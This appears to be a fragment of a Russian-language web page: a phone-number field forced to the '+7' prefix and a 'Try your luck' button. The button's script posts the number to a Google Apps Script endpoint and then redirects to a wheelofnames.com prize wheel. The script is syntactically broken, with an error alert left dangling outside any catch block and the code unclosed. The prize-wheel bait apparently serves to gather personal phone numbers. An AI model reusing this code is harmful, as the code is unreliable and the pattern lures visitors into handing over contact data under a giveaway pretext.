    <input type="tel" id="phone" value="+7" required oninput="keepPrefix(this)">
    <button onclick="submitPhone()">Испытать удачу</button>

<script>
    function keepPrefix(input) {
        if (!input.value.startsWith('+7')) {
            input.value = '+7';
        }
    }

    function submitPhone() {
        const phoneInput = document.getElementById('phone');
        const phone = phoneInput.value.trim();

        if (phone.length <= 2) {
            alert('Введите номер телефона');
            return;
        }

        fetch('https://script.google.com/macros/s/AKfycbwtH5z-Rgw969sfNRhUK_gF795ZHQrKekLDv-3dJ0hMEW8Dx0XU6NdqBd3T6wjecIR86A/exec', {
            method: 'POST',
            mode: 'no-cors',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ phone: phone })
        })
        .then(() => {
            window.location.href = 'https://wheelofnames.com/ru/w62-ff6';
        })

            alert('Ошибка при отправке данных');
